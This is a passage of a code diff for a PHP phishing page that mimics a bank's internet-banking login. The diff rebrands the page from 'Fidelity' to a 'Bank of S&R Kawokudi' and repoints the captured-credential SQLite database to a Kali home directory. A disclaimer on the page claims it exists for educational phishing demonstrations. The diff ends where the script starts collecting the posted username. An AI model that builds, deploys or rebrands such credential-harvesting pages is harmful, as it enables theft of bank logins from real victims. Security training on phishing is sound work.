@@ -34,15 +34,15 @@
 <body>
 
     <div id="header">
-		<div id="_topMenu">
-		
+		<div id="myHead">
+        <p style="font-family: Garamond, serif;   font-size: 150%; font-weight: bold;"> Bank of S&R Kawokudi</p>
 		</div>
 		<form name="frmlang" method="POST" action="<?php echo $_SERVER['PHP_SELF'];?>">
 			
 				<div id="main" style="left:0px;width:100%!important;position:relative !important">
                     <div id="section">
                     <div id="keyboard_firstrowtwrapper">
-                        <div id="keyboard_bankname">Please login to Fidelity Retail Internet Banking</div>
+                        <div id="keyboard_bankname">Please login to S&R Retail Internet Banking</div>
                         <div id="keyboard_themselection">
                             <table>
                                 <tbody><tr><td><label for="fldlitever">Choose Theme</label></td><td><select id="fldlitever" name="fldlitever" tabindex="3" style="width:auto;height:auto"><option value="">Default</option><option value="C">Contemporary</option><option value="L">Classic</option></select></td></tr>
@@ -107,7 +107,7 @@
                                             <br />
 
                                             <div id="disclaimer" class="text-right" style="color: red; font-weight:bold">
-                                                <p>DISCLAMER: This page is created for educational purposes ONLY to demonstrate phishing attack. Please, do not enter your Fidelity bank information here. Thank you</p>
+                                                <p>DISCLAMER: This page is created for educational purposes ONLY to demonstrate phishing attack. Please, do not enter your bank information here. Thank you</p>
                                             </div>
                                     </div>
                                 </div>
@@ -123,7 +123,7 @@
 
 
 <?php
-$db = new PDO("sqlite:/home/kali/wwwdata/fidelityusers.db");
+$db = new PDO("sqlite:/home/kali/mybankphish/fidelityusers.db");
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
   // collect value of input field
   $myUsername = $_POST['myUsername'];
